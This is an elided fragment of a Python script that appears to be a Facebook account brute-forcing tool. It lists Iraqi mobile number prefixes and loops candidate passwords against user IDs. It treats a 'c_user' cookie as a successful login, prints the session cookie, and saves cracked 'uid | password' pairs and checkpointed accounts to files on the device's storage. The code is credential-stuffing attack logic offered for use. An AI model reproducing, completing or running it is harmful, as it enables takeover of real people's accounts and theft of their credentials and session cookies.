...
def fuck():
    ...
    print('[+] IRAQ NAMBER CODE: 0770, 0750, 0772, 0751')
...
def mumit2(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[Vear]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"\033[1;92m[Vear-OK] {uid}|{ps} \nCookie : {coki}")

                open('/sdcard/Vear/OK.txt', 'a').write( uid+' | '+ps+'\n')
                ...
                print(f"\033[1;94m[Vear-CP] {cid}|{ps}")

                open('/sdcard/Vear-CP.txt', 'a').write( uid+' | '+ps+' \n')
